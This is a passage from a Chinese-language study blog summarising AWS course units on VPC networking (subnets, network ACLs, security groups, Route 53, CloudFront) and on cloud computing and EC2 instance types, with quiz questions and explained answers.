<p>比喻:</p>
<p><img src="/img/AWS34_19.png" alt="Untitled"></p>
<p><img src="/img/AWS34_20.png" alt="Untitled"></p>
<ul>
<li><p>咖啡店範例</p>
<ul>
<li>流程描述<ul>
<li>客人向收銀員點餐<ul>
<li>收銀員接收訂單並處理</li>
</ul>
</li>
<li>收銀員將訂單交給咖啡師<ul>
<li>咖啡師製作咖啡</li>
</ul>
</li>
<li>客人順序點餐，排隊人龍順暢移動</li>
<li>客人試圖跳過收銀員直接向咖啡師點餐<ul>
<li>中斷動線流動，導致受限制</li>
</ul>
</li>
</ul>
</li>
<li>解決方法<ul>
<li>咖啡店老闆將收銀員和咖啡師配置在不同的工作站<ul>
<li>區分櫃檯區域，保持流動順暢</li>
</ul>
</li>
<li>收銀員的工作站<ul>
<li>專為接待客人而設計</li>
</ul>
</li>
<li>咖啡師的工作站<ul>
<li>不對外開放，僅處理訂單</li>
</ul>
</li>
</ul>
</li>
<li>示意圖<ul>
<li>一名收銀員，一名咖啡師，三名排隊的客戶<ul>
<li>第一位客戶向收銀員點餐，收銀員接收訂單並轉交給咖啡師</li>
<li>最後一名客戶試圖直接向咖啡師點餐，但無法這樣做</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>子網路</p>
<p>  <img src="/img/AWS34_21.png" alt="Untitled"></p>
<ul>
<li>定義<ul>
<li>VPC 的區段，用於將資源分組，可以設為公有或私有</li>
</ul>
</li>
<li>公有子網路<ul>
<li>包含需要開放存取的資源，如線上商店的網站</li>
<li><strong>支援客戶使用的網站</strong></li>
</ul>
</li>
<li>私有子網路<ul>
<li>包含只能透過私有網路存取的資源，如含有客戶個人資訊的資料庫</li>
<li><strong>分隔含有客戶個人資訊的資料庫</strong></li>
</ul>
</li>
<li>子網路通訊<ul>
<li>可以彼此通訊，如公有子網路的 EC2 執行個體與私有子網路中的資料庫</li>
</ul>
</li>
</ul>
</li>
<li><p>網路流量</p>
<ul>
<li>封包<ul>
<li>以封包形式傳送的請求資料</li>
</ul>
</li>
<li>流量進出 VPC<ul>
<li>透過網際網路閘道進入 VPC</li>
<li>在進出子網路之前檢查權限</li>
</ul>
</li>
</ul>
</li>
<li><p>網路 ACL</p>
<p>  <img src="/img/AWS34_22.png" alt="Untitled"></p>
<ul>
<li><p>定義</p>
<ul>
<li>控制子網路層級的傳入和傳出流量的虛擬防火牆</li>
</ul>
</li>
<li><p>功能</p>
<ul>
<li><p>無狀態封包篩選</p>
<ul>
<li>忽略所有規則，檢查往來跨越子網路邊界的封包</li>
</ul>
<p>  <img src="/img/AWS34_23.png" alt="Untitled"></p>
</li>
</ul>
</li>
<li><p>設定</p>
<ul>
<li>預設網路 ACL<ul>
<li>允許所有傳入和傳出流量，可自行修改</li>
</ul>
</li>
<li>自訂網路 ACL<ul>
<li>所有流量都被拒絕，除非新增規則允許</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>安全群組</p>
<p>  <img src="/img/AWS34_24.png" alt="Untitled"></p>
<ul>
<li><p>定義</p>
<ul>
<li>控制 EC2 執行個體的傳入和傳出流量的虛擬防火牆</li>
</ul>
</li>
<li><p>功能</p>
<ul>
<li><p>有狀態封包篩選</p>
<p>  <img src="/img/AWS34_25.png" alt="Untitled"></p>
<p>  封包從用戶端透過網際網路傳輸到網際網路閘道，然後進入 VPC。然後，該封包通過網路存取控制清單 (ACL)，並存取兩個 EC2 執行個體所在的公有子網路。</p>
<ul>
<li>記住先前針對傳入封包所做的決定</li>
<li>無論傳入安全群組規則為何，安全群組都會允許回應繼續執行</li>
</ul>
<p>  <img src="/img/AWS34_26.png" alt="Untitled"></p>
</li>
</ul>
</li>
<li><p>設定</p>
<ul>
<li>預設情況<ul>
<li>拒絕所有傳入流量，允許所有傳出流量</li>
</ul>
</li>
<li>自訂規則<ul>
<li>設定允許或拒絕特定流量</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="知識檢測"><a href="#知識檢測" class="headerlink" title="知識檢測"></a><strong>知識檢測</strong></h3><p>下列哪個敘述與 AWS 帳戶的預設網路存取控制清單 (ACL) 最相符？</p>
<ul>
<li><input disabled="" type="checkbox"> 它無狀態，且會拒絕所有傳入和傳出流量。</li>
<li><input disabled="" type="checkbox"> 它有狀態，且會允許所有傳入和傳出流量。</li>
<li><input checked="" disabled="" type="checkbox"> 它無狀態，且會允許所有傳入和傳出流量。</li>
</ul>
<blockquote>
<p>網路存取控制清單 (ACL) 會執行<strong>無狀態</strong>封包篩選。這項功能會忽略所有規則，一律檢查往來跨越子網路邊界的傳入和傳出封包。</p>
<p>每個 AWS 帳戶都包含一個預設網路 ACL。設定 VPC 時，您可以使用帳戶的預設網路 ACL，也可以建立自訂網路 ACL。</p>
<p>根據預設，帳戶的預設網路 ACL 會允許所有傳入和傳出流量，但您可以自行新增規則來加以修改。如使用自訂網路 ACL，則所有傳入和傳出流量都會遭到拒絕，除非您新增規則，指定應允許哪些流量。此外，所有網路 ACL 都具備一項明確拒絕規則。此規則可確保在封包未符合清單上任何其他規則的情況下，會拒絕該封包。</p>
</blockquote>
<ul>
<li><input disabled="" type="checkbox"> 它有狀態，且會拒絕所有傳入和傳出流量。</li>
</ul>
<h2 id="全球網路"><a href="#全球網路" class="headerlink" title="全球網路"></a><strong>全球網路</strong></h2><ul>
<li>客戶與 AWS 基礎設施互動<ul>
<li><p>DNS (Domain Name System)</p>
<p>  <img src="/img/AWS34_27.png" alt="Untitled"></p>
<p>  用戶端連線至尋找網域的 DNS 解析器。解析器將請求轉送至 DNS 伺服器，該伺服器則將 IP 地址傳回解析器。</p>
<ul>
<li>定義<ul>
<li>將網站名稱翻譯成 IP 地址的服務</li>
</ul>
</li>
<li>路由流程<ul>
<li>客戶輸入網址至瀏覽器</li>
<li>瀏覽器聯絡 DNS 解析器</li>
<li>解析器向 DNS 伺服器查詢 IP 地址</li>
<li>公司 DNS 伺服器提供 IP 地址</li>
</ul>
</li>
</ul>
</li>
<li><p>Amazon Route 53</p>
<ul>
<li>功能<ul>
<li>提供 DNS 服務</li>
<li>管理網域名稱的 DNS 記錄</li>
</ul>
</li>
<li>路由政策<ul>
<li><p>Latency Based Routing</p>
<ul>
<li>基於最低延遲路由流量</li>
</ul>
</li>
<li><p>地理位置 DNS</p>
<ul>
<li>根據客戶所在地區路由流量</li>
</ul>
</li>
<li><p>地理鄰近度</p>
<ul>
<li>將流量路由至最近的節點</li>
</ul>
</li>
<li><p>加權輪詢算法</p>
<ul>
<li>根據權重分配流量到不同的端點</li>
</ul>
</li>
<li><p><strong>Amazon Route 53 和 Amazon CloudFront 交付內容</strong></p>
<p>  <img src="/img/AWS34_28.png" alt="Untitled"></p>
<ul>
<li>AnyCompany 的應用程式在數個 Amazon EC2 執行個體上執行</li>
<li>執行個體所在的 Auto Scaling 群組連接到 Application Load Balancer<ul>
<li>客戶前往 AnyCompany 的網站以便請求應用程式的資料</li>
<li>Amazon Route 53 使用 DNS 解析來識別 AnyCompany.com 的相應 IP 地址 192.0.2.0。這個資訊會再傳回給客戶</li>
<li>客戶的請求會透過 Amazon CloudFront 傳送到最近的節點</li>
<li>Amazon CloudFront 會連接到 Application Load Balancer，後者會將傳入的封包傳送到 Amazon EC2 執行個體</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>CDN (Content Delivery Network)</p>
<ul>
<li>定義<ul>
<li>協助加快將網站資產交付給客戶的網路</li>
</ul>
</li>
<li>Amazon CloudFront<ul>
<li>功能<ul>
<li>部署靜態網路資產到全球節點，提高存取速度</li>
</ul>
</li>
<li>運作方式<ul>
<li>客戶存取網站</li>
<li>請求透過 CloudFront 網路</li>
<li>CloudFront 將請求路由到最近的節點</li>
<li>節點從遠端伺服器擷取資料</li>
<li>資料傳送至客戶，減少延遲</li>
</ul>
</li>
</ul>
</li>
<li>使用案例<ul>
<li>北美洲使用者存取網站<ul>
<li>資產部署到北美洲節點</li>
</ul>
</li>
<li>愛爾蘭使用者存取網站<ul>
<li>資產部署到愛爾蘭節點</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="知識檢測-1"><a href="#知識檢測-1" class="headerlink" title="知識檢測"></a><strong>知識檢測</strong></h3><p>以下哪個敘述與 DNS 解析最相符？</p>
<ul>
<li><input disabled="" type="checkbox"> 在自己定義的虛擬網路中啟動資源</li>
<li><input disabled="" type="checkbox"> 在世界各地的節點儲存本機的內容副本</li>
<li><input disabled="" type="checkbox"> 將 VPC 連接到網際網路</li>
<li><input checked="" disabled="" type="checkbox"> 將網域名稱轉譯為 IP 位址</li>
</ul>
<blockquote>
<p>舉例來說，如果您想前往 AnyCompany 的網站，於是在 PC 輸入網域名稱，這個請求就會傳送到 DNS 伺服器。接下來，DNS 伺服器會向 Web 伺服器要求與 AnyCompany 的網站對應的 IP 位址。Web 伺服器的回應方式是提供某公司網站的 IP 位址 192.0.2.0。</p>
</blockquote>
<h2 id="單元-4-總結"><a href="#單元-4-總結" class="headerlink" title="單元 4 總結"></a><strong>單元 4 總結</strong></h2><ul>
<li><p>AWS 網路連結</p>
<ul>
<li>概述<ul>
<li>將網路連結簡化並抽象化，只需回答「有誰能與彼此互相溝通」這個問題</li>
</ul>
</li>
<li>VPC (Virtual Private Cloud)<ul>
<li>隔離工作負載的方式</li>
</ul>
</li>
<li>網路安全<ul>
<li>閘道</li>
<li>網路 ACL</li>
<li>安全群組</li>
<li>阻止顛覆性攻擊的方式</li>
</ul>
</li>
<li>VPN 和 Direct Connect<ul>
<li>連線到 AWS 的方式</li>
</ul>
</li>
<li>加密<ul>
<li>在一般網際網路上進行加密</li>
<li>建立專屬光纖網路安全管道</li>
</ul>
</li>
<li>AWS 全球網路<ul>
<li>使用節點提供的全球網路</li>
</ul>
</li>
<li>Route 53<ul>
<li>用於 DNS 的服務</li>
</ul>
</li>
<li>CloudFront<ul>
<li>就近快取內容給消費者的服務</li>
</ul>
</li>
</ul>
<h3 id="單元-4-測驗"><a href="#單元-4-測驗" class="headerlink" title="單元 4 測驗"></a><strong>單元 4 測驗</strong></h3><p>  您的公司有一款應用程式使用 Amazon EC2 執行個體來執行客戶使用的網站，並使用 Amazon RDS 資料庫執行個體來存放客戶的個人資訊。根據最佳實務，開發人員應該如何設定 VPC？</p>
<ul>
<li><input disabled="" type="checkbox"> 將 Amazon EC2 執行個體放在私有子網路中，將 Amazon RDS 資料庫執行個體放在公有子網路中。</li>
<li><input checked="" disabled="" type="checkbox"> 將 Amazon EC2 執行個體放在公有子網路中，將 Amazon RDS 資料庫執行個體放在私有子網路中。</li>
</ul>
<blockquote>
<p>正確答案是<strong>將 Amazon EC2 執行個體放在公有子網路中，將 Amazon RDS 資料庫執行個體放在私有子網路中</strong>。</p>
<p><strong>子網路</strong>是 VPC 的一個區段，您可以根據安全或操作需求將資源分組到區段中。子網路可以設為公有或私有。</p>
<p>公有子網路包含需要開放存取的資源，例如線上商店的網站。</p>
<p>私有子網路包含只能透過私有網路存取的資源，例如含有客戶個人資訊和訂單紀錄的資料庫。</p>
</blockquote>
<ul>
<li><input disabled="" type="checkbox"> 將 Amazon EC2 執行個體和 Amazon RDS 資料庫執行個體都放在公有子網路中。</li>
<li><input disabled="" type="checkbox"> 將 Amazon EC2 執行個體和 Amazon RDS 資料庫執行個體都放在私有子網路中。</li>
</ul>
<p>  以下哪個元件可用於建立公司的資料中心和 AWS 之間的私有專用連線？</p>
<ul>
<li><input disabled="" type="checkbox"> 私有子網路</li>
<li><input disabled="" type="checkbox"> DNS</li>
<li><input checked="" disabled="" type="checkbox"> AWS Direct Connect</li>
</ul>
<blockquote>
<p>其他答案皆不正確，因為：</p>
<ul>
<li>私有子網路是 VPC 的一個區段，您可以將只能透過私有網路存取的資源分組到這些區段中。儘管私有，但它不會用於建立資料中心和 AWS 之間的連線。</li>
<li>DNS 全稱為網域名稱系統，它是用於與 IP 地址的網域名稱比對的目錄。</li>
<li>虛擬私有閘道可讓您在 VPC 和私有網路 (例如公司的資料中心) 之間建立 VPN 連線。雖然此連線為私有且經過加密，但是會流經公有網際網路，而不是經由專用連線。</li>
</ul>
</blockquote>
<ul>
<li><input disabled="" type="checkbox"> 虛擬私有閘道</li>
</ul>
<p>  以下哪個敘述與安全群組最相符？</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 根據預設，它們具有狀態，且會拒絕所有傳入流量。</li>
</ul>
<blockquote>
<p>安全群組是具狀態的。也就是說，它們在評估執行個體的新請求時，會運用先前的流量模式和流動情形。</p>
<p>根據預設，安全群組會拒絕所有傳入流量，但您可以新增自訂規則，以便符合自己的操作和安全需求。</p>
</blockquote>
<ul>
<li><input disabled="" type="checkbox"> 根據預設，它們具有狀態，且會允許所有傳入流量。</li>
<li><input disabled="" type="checkbox"> 根據預設，它們沒有狀態，且會拒絕所有傳入流量。</li>
<li><input disabled="" type="checkbox"> 根據預設，它們沒有狀態，且會允許所有傳入流量。</li>
</ul>
<p>  以下哪個元件使用於將 VPC 連接到網際網路？</p>
<ul>
<li><input disabled="" type="checkbox"> 公有子網路</li>
<li><input disabled="" type="checkbox"> 節點</li>
<li><input disabled="" type="checkbox"> 安全群組</li>
<li><input checked="" disabled="" type="checkbox"> 網際網路閘道</li>
</ul>
<blockquote>
<p>其他回答選項皆不正確，因為：</p>
<ul>
<li>公有子網路是 VPC 的區段，包含公有資源。</li>
<li>節點是 Amazon CloudFront 用來存放內容快取副本的地點，藉此加速向客戶交付內容。</li>
<li>安全群組是一種虛擬防火牆，可控制 Amazon EC2 執行個體的傳入和傳出流量。</li>
</ul>
</blockquote>
<p>  以下哪種服務可用於管理網域名稱的 DNS 記錄？</p>
<ul>
<li><input disabled="" type="checkbox"> Amazon Virtual Private Cloud</li>
<li><input disabled="" type="checkbox"> AWS Direct Connect</li>
<li><input disabled="" type="checkbox"> Amazon CloudFront</li>
<li><input checked="" disabled="" type="checkbox"> Amazon Route 53</li>
</ul>
<blockquote>
<p>Amazon Route 53 是一種 DNS Web 服務。它提供可靠的方式，讓開發人員和企業將終端使用者路由到託管於 AWS 的網際網路應用程式。</p>
<p>Route 53 還具備能力管理網域名稱的 DNS 紀錄。您可以轉移其他網域註冊機構管理的現有網域名稱下存在的 DNS 記錄。您也可以直接在 Route 53 中註冊新的網域名稱。</p>
<p>其他選項皆不正確，因為：</p>
<ul>
<li>Amazon Virtual Private Cloud (Amazon VPC) 這項服務可讓您佈建 AWS Cloud 的分隔區段。在這個分隔區段中，您可以在自己定義的虛擬網路中啟動資源。</li>
<li>AWS Direct Connect 這項服務可讓您在資料中心和 VPC 之間建立專用私有連線。</li>
<li>Amazon CloudFront 是一種內容交付服務。這種服務使用節點網路來快取內容，並將內容交付給世界各地的客戶。</li>
</ul>
</blockquote>
</li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-AWS12" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/AWS12/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.073Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/AWS12/">
        AWS Basic Architecture 1
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="單元一簡介"><a href="#單元一簡介" class="headerlink" title="單元一簡介"></a>單元一簡介</h1><ol>
<li><p><strong>AWS 提供廣泛的服務</strong>：AWS 提供各種服務，從基本的運算、儲存和網路安全工具，到複雜的解決方案，如區塊鏈、機器學習、人工智慧和機器人開發平台。</p>
</li>
<li><p><strong>用戶端-伺服器模型</strong>：現代運算通常使用<strong>用戶端-伺服器</strong>模型。</p>
<p> <img src="/img/AWS12.png" alt="Untitled"></p>
<ul>
<li>用戶端可以是 Web 瀏覽器或桌面應用程式，向伺服器提出請求</li>
<li>伺服器可以是虛擬伺服器，如 Amazon EC2。</li>
</ul>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用戶端                          伺服器</span><br><span class="line">(客人)                         (咖啡師)</span><br><span class="line"></span><br><span class="line">    |                            | </span><br><span class="line">    |提出點咖啡的請求 -----------&gt;  |</span><br><span class="line">    |&lt;------ 檢查請求是否合法----   |</span><br><span class="line">    |                           |</span><br><span class="line">    |准備支付                     |</span><br><span class="line">    |------------&gt;確認支付是否成功  |</span><br><span class="line">    |&lt;------準備咖啡------------- |</span><br><span class="line">    |                           |</span><br><span class="line">    |收到咖啡 &lt;-----------咖啡完成  |</span><br><span class="line"></span><br><span class="line">------------------------------------------</span><br><span class="line">在此流程圖中：</span><br><span class="line"></span><br><span class="line">- 用戶端代表了咖啡店的客人，他們提出點咖啡的請求。</span><br><span class="line">- 伺服器代表了咖啡店的咖啡師，他們負責準備咖啡。</span><br><span class="line">- 箭頭表示信息的流動方向，從用戶端到伺服器，以及從伺服器到用戶端。</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>按需支付</strong>：AWS 的支付模式是按需支付，不需要預先支付任何費用，也不必擔心容量限制。只有在需要時才支付費用，並且可以隨時釋放不再需要的資源。</p>
</li>
<li><p><strong>雲端運算基礎概念</strong>：AWS 的基礎概念包括按需計費、彈性伸縮、安全性、高可用性等。這些概念有助於業務有效地運行在雲端平台上。</p>
</li>
<li><p><strong>教育和支援</strong>：AWS 提供廣泛的教育和支援，讓用戶能夠瞭解和利用 AWS 的各種功能和服務，包括培訓課程、文件和社群支援。</p>
</li>
</ol>
<h2 id="雲端運算"><a href="#雲端運算" class="headerlink" title="雲端運算"></a>雲端運算</h2><ul>
<li>雲端運算的核心概念<ul>
<li>雲端運算是透過網際網路提供的 IT 資源隨需交付<ul>
<li>隨需交付<ul>
<li>AWS 可在有需求時立即提供所需資源</li>
<li>無需事先告知何時需要資源</li>
<li>靈活地啟用和停用資源，隨即停止付費</li>
<li>非常靈活，無法透過自行管理資料中心實現的靈活性</li>
</ul>
</li>
</ul>
</li>
<li>IT 資源的概念<ul>
<li>重要性<ul>
<li>AWS 的目標是協助用戶專注於突顯業務獨特性</li>
</ul>
</li>
<li>無差異的繁重工作<ul>
<li>AWS 針對重複性高、耗時的任務提供協助</li>
<li>用戶可以透過安全的網頁主控台或程式設計方式存取資源</li>
</ul>
</li>
<li>實支實付的定價<ul>
<li>用戶只需支付所使用的資源費用</li>
<li>無需預付費用或額外合約</li>
</ul>
</li>
</ul>
</li>
<li>雲端運算的部署模型<ul>
<li>雲端<ul>
<li>在雲端中執行完整的應用程式</li>
<li>遷移現有應用程式或建立新應用程式</li>
</ul>
</li>
<li>內部部署<ul>
<li>使用虛擬化和資源管理工具部署資源</li>
<li>提高資源使用率</li>
</ul>
</li>
<li>混合<ul>
<li>將雲端資源連接到內部部署基礎設施</li>
<li>整合雲端資源與傳統 IT 應用程式</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>雲端運算的優勢<ul>
<li>將預付成本轉成變動成本<ul>
<li>省去投資於資料中心和伺服器的預先投資</li>
</ul>
</li>
<li>停止將資金花費在執行和維護資料中心上<ul>
<li>減少在基礎設施管理上的時間和金錢</li>
</ul>
</li>
<li>無需猜測容量<ul>
<li>不必預先評估需要多少基礎設施容量</li>
<li>可根據需求動態調整資源</li>
</ul>
</li>
<li>受益於大範圍規模經濟<ul>
<li>可以享有更低的成本</li>
</ul>
</li>
<li>提升速度和敏捷性<ul>
<li>可以更快速地開發和部署應用程式</li>
</ul>
</li>
<li>快速進入全球市場<ul>
<li>可以迅速向全球部署應用程式並降低延遲</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="單元一測驗"><a href="#單元一測驗" class="headerlink" title="單元一測驗"></a>單元一測驗</h3><p>回答本測驗中的問題，測試您對本單元中某些主要概念的理解程度。</p>
<ol>
<li>什麼是雲端運算？</li>
</ol>
<ul>
<li><p><input disabled="" type="checkbox"> 
將儲存在桌上型電腦和行動裝置中的檔案加以備份，以防資料遺失</p>
</li>
<li><p><input disabled="" type="checkbox"> 
部署連線至內部部署基礎設施的應用程式</p>
</li>
<li><p><input disabled="" type="checkbox"> 
無需管理或佈建伺服器即可執行程式碼</p>
</li>
<li><p><input checked="" disabled="" type="checkbox"> 
透過網路以實支實付定價方式收費的 IT 資源和應用程式隨需交付</p>
<p>  其他回答選項皆不正確，因為：</p>
<blockquote>
<p>檔案雖然可以備份到雲端，但第一個選項並未完整解釋雲端運算。</p>
<p>部署連接到內部部署基礎設施的應用程式是混合雲端部署的使用案例。別忘了，雲端運算還有雲端和內部部署 (或私有雲端) 的部署模型。</p>
<p>AWS Lambda 是一項 AWS 服務，可讓您在不需要管理或佈建伺服器的情況下執行程式碼。這項描述並未完整說明雲端運算</p>
</blockquote>
</li>
</ul>
<ol>
<li>內部部署的別稱是什麼？</li>
</ol>
<ul>
<li><p><input checked="" disabled="" type="checkbox"> 
私有雲端部署</p>
<p>  其他回答選項皆不正確，因為：</p>
<blockquote>
<p>雲端應用程式會完全部署在雲端中，不會有以內部部署方式執行的任何部分。</p>
<p>混合部署會連接起雲端資源與雲端外現有資源 (例如內部部署資源) 之間的基礎設施和應用程式。不過，混合部署並不等同於內部部署，因為它需使用到位於雲端的資源。</p>
<p>AWS 雲端提供三種雲端部署模型：雲端、混合和內部部署。 AWS 雲端不等同於內部部署本身。</p>
</blockquote>
</li>
<li><p><input disabled="" type="checkbox"> 
雲端應用程式</p>
</li>
<li><p><input disabled="" type="checkbox"> 
混合部署</p>
</li>
<li><p><input disabled="" type="checkbox"> 
AWS 雲端</p>
</li>
</ul>
<ol>
<li>雲端運算的規模為何有助於節省成本？</li>
</ol>
<ul>
<li><p><input disabled="" type="checkbox"> 
您不必在使用技術資源之前預先進行投資。</p>
</li>
<li><p><input checked="" disabled="" type="checkbox"> 
大量客戶的雲端用量經過彙總後，會產生較低廉的實支實付價格。</p>
<p>  其他回答選項皆不正確，因為：</p>
<blockquote>
<p>您不必在使用技術資源之前預先進行投資，請參考<em>將預付成本轉成變動成本</em>。</p>
<p>隨需存取服務可避免容量過多或受限，請參考<em>無需猜測容量</em>。</p>
<p>可快速向客戶部署應用程式部署，並降低延遲，請參考<em>快速進入全球市場</em>。</p>
</blockquote>
</li>
<li><p><input disabled="" type="checkbox"> 
隨需存取服務有助於防止容量過剩或受限。</p>
</li>
<li><p><input disabled="" type="checkbox"> 
您可以快速向客戶部署應用程式，並且降低延遲。</p>
</li>
</ul>
<h1 id="單元二簡介"><a href="#單元二簡介" class="headerlink" title="單元二簡介"></a>單元二簡介</h1><p><img src="/img/AWS12_1.png" alt="Untitled"></p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> AWS (Amazon Web Services)</span><br><span class="line">  |</span><br><span class="line">  |- Amazon Elastic Compute Cloud (Amazon EC2)</span><br><span class="line">  |   |</span><br><span class="line">  |   |- 靈活、符合成本效益、快速的運算</span><br><span class="line">  |   |- 虛擬化技術管理的實體主機電腦上執行</span><br><span class="line">  |   |   |- 會與多個其他執行個體(虛擬機器)一起共用主機</span><br><span class="line">  |   |   |-  Hypervisor </span><br><span class="line">  |   |   |   |- 虛擬機器之間分享基礎實體資源</span><br><span class="line">  |   |   |   |- 共用基礎硬體的概念稱為多租用戶(由AWS管理)</span><br><span class="line">  |   |- 代替內部部署資源</span><br><span class="line">  |   |- 啟動 EC2 執行個體的流程</span><br><span class="line">  |   |   |</span><br><span class="line">  |   |   |- 1. 啟動</span><br><span class="line">  |   |   |   |- 選擇基本組態範本、執行個體類型</span><br><span class="line">  |   |   |   |   |- 包括作業系統、應用程式伺服器或應用程式</span><br><span class="line">  |   |   |   |- 指定安全設定</span><br><span class="line">  |   |   |   |   |- 控制可往來流經執行個體的網路流量</span><br><span class="line">  |   |   |- 2. 連接</span><br><span class="line">  |   |   |   |- 多種方式連接到執行個體</span><br><span class="line">  |   |   |   |   |- 程式和應用程式有多種不同方法來直接連接到執行個體並交換資料</span><br><span class="line">  |   |   |   |   |- 使用者登入並存取電腦桌面來連接執行個體</span><br><span class="line">  |   |   |- 3. 使用</span><br><span class="line">  |   |       |- 在執行個體中執行命令、安裝軟體等</span><br><span class="line">  |   |</span><br><span class="line">  |   |- 執行個體的靈活性和控制性</span><br><span class="line">  |   |   |</span><br><span class="line">  |   |   |- 選擇作業系統和執行軟體</span><br><span class="line">  |   |   |- <span class="strong">**垂直擴展**</span>執行個體(擴大或縮小)</span><br><span class="line">  |   |   |- 控制網路連結層面</span><br><span class="line">  |   |   |   |   |- 決定伺服器可以接收請求的類型、是否可公開/私有方式存取</span><br><span class="line">  |</span><br><span class="line">  |- 優點</span><br><span class="line">  |   |</span><br><span class="line">  |   |- 將預付成本轉成變動成本</span><br><span class="line">  |   |- 停止將資金花費在執行和維護資料中心上</span><br><span class="line">  |   |- 無需猜測容量</span><br><span class="line">  |   |- 受益於大範圍規模經濟</span><br><span class="line">  |   |- 提升速度和敏捷性</span><br><span class="line">  |   |- 快速進入全球市場</span><br><span class="line">  |</span><br><span class="line">  |- 雲端運算的部署模型</span><br><span class="line"><span class="code">      |</span></span><br><span class="line"><span class="code">      |- 以雲端為基礎進行部屬</span></span><br><span class="line"><span class="code">      |   |- 在雲端中執行完整的應用程式</span></span><br><span class="line"><span class="code">      |   |- 將現有的應用程式遷移至雲端</span></span><br><span class="line"><span class="code">      |   |- 在雲端中設計和建立新的應用程式</span></span><br><span class="line"><span class="code">      |</span></span><br><span class="line"><span class="code">      |- 內部部屬之部署方式</span></span><br><span class="line"><span class="code">      |   |- 透過虛擬化和資源管理工具部署資源</span></span><br><span class="line"><span class="code">      |   |- 運用應用程式管理和虛擬化技術提高資源使用率</span></span><br><span class="line"><span class="code">      |</span></span><br><span class="line"><span class="code">      |- 混合部署</span></span><br><span class="line"><span class="code">          |- 將雲端資源連接到內部部署基礎設施</span></span><br><span class="line"><span class="code">          |- 整合雲端資源與傳統 IT 應用程式</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<ul>
<li>當虛擬機器共用主機的資源時，Hypervisor 會負責將虛擬機器彼此分隔</li>
<li>這表示 EC2 執行個體很安全。即使它們會共用資源，某個 EC2 執行個體並無法感知到該主機上是否存在任何其他 EC2 執行個體</li>
<li>它們會彼此分隔，並受到保護</li>
<li>CaaS 運算即服務</li>
</ul>
<h2 id="Amazon-EC2-執行個體類型"><a href="#Amazon-EC2-執行個體類型" class="headerlink" title="Amazon EC2 執行個體類型"></a><strong>Amazon EC2 執行個體類型</strong></h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Amazon EC2 執行個體類型</span><br><span class="line">│</span><br><span class="line">├── 一般用途執行個體</span><br><span class="line">│   ├── 平衡運算、記憶體、網路資源</span><br><span class="line">│   ├── 適用於各種工作負載，如應用程式伺服器、遊戲伺服器等</span><br><span class="line">│</span><br><span class="line">├── 運算最佳化執行個體</span><br><span class="line">│   ├── 專為運算密集型任務設計</span><br><span class="line">│   ├── 適用於高效能 Web 伺服器、運算密集的應用程式伺服器等</span><br><span class="line">│   ├── 批次處理工作負載</span><br><span class="line">│</span><br><span class="line">├── 記憶體最佳化執行個體</span><br><span class="line">│   ├── 專為處理大型資料集的工作負載設計</span><br><span class="line">│   ├── 適合記憶體密集型任務</span><br><span class="line">│   ├── 適用於高效能資料庫、即時處理大量資料的工作負載等</span><br><span class="line">│</span><br><span class="line">├── 加速運算執行個體</span><br><span class="line">│   ├── 使用硬體加速器提高效率</span><br><span class="line">│   ├── 用於浮點數計算、圖形處理，或是資料模式比對</span><br><span class="line">│   ├── 適用於圖形應用程式、遊戲串流等</span><br><span class="line">│   ├── 採用硬體加速器</span><br><span class="line">│</span><br><span class="line">└── 儲存最佳化執行個體</span><br><span class="line"><span class="code">    ├── 專為處理超大型資料集的存取工作負載設計</span></span><br><span class="line"><span class="code">    ├── 適用於分散式檔案系統、資料倉儲應用程式等</span></span><br><span class="line"><span class="code">    ├── 需要對本機儲存資料進行高效能處理的工作負載</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<h3 id="知識檢測"><a href="#知識檢測" class="headerlink" title="知識檢測"></a><strong>知識檢測</strong></h3><ol>
<li>什麼 Amazon EC2 執行個體類型適合資料倉儲應用？</li>
</ol>
<ul>
<li><input disabled="" type="checkbox"> 記憶體最佳化</li>
<li><input checked="" disabled="" type="checkbox"> 儲存最佳化</li>
<li><input disabled="" type="checkbox"> 一般用途</li>
<li><input disabled="" type="checkbox"> 運算最佳化</li>
</ul>
<ol>
<li>哪一種 Amazon EC2 執行個體類型可以取得運算、記憶體和連網資源的平衡？</li>
</ol>
<ul>
<li><input disabled="" type="checkbox"> 記憶體最佳化</li>
<li><input disabled="" type="checkbox"> 儲存最佳化</li>
<li><input checked="" disabled="" type="checkbox"> 一般用途</li>
<li><input disabled="" type="checkbox"> 運算最佳化</li>
</ul>
<ol>
<li>什麼 Amazon EC2 執行個體類型最適合高效能資料庫？</li>
</ol>
<ul>
<li><input checked="" disabled="" type="checkbox"> 記憶體最佳化</li>
<li><input disabled="" type="checkbox"> 儲存最佳化</li>
<li><input disabled="" type="checkbox"> 一般用途</li>
<li><input disabled="" type="checkbox"> 運算最佳化</li>
</ul>
<ol>
<li>哪一種 Amazon EC2 執行個體類型提供高效能處理器？</li>
</ol>
<ul>
<li><input disabled="" type="checkbox"> 記憶體最佳化</li>
<li><input disabled="" type="checkbox"> 儲存最佳化</li>
<li><input disabled="" type="checkbox"> 一般用途</li>
<li><input checked="" disabled="" type="checkbox"> 運算最佳化</li>
</ul>
